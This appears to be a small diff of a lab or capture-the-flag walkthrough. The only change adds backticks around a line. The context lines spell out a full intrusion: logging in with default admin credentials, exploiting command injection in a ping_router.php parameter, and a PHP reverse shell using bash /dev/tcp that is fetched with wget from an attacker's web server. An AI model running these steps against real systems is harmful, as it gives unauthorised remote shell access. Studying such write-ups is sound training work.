@@ -30,7 +30,7 @@ http://192.168.XX.53:8787/2315e8131432505230f581cf689e783a/shell.php
 1. Go to Port 4080 and login as admin:admin
 2. Command Injection in http://192.168.XX.95:4080/ping_router.php?cmd=1.1.1.1
 3. Create php reverse shell -
-<?php exec("bash -c 'bash -i >& /dev/tcp/192.168.XX.XX/80 0>&1'"); ?>
+`<?php exec("bash -c 'bash -i >& /dev/tcp/192.168.XX.XX/80 0>&1'"); ?>`
 4. Start a web server: python -m SimpleHTTPServer 80
 5. Upload it via command injection -
 http://192.168.XX.95:4080/ping_router.php?cmd=1.1.1.1;wget+192.168.XX.XX/shell.php
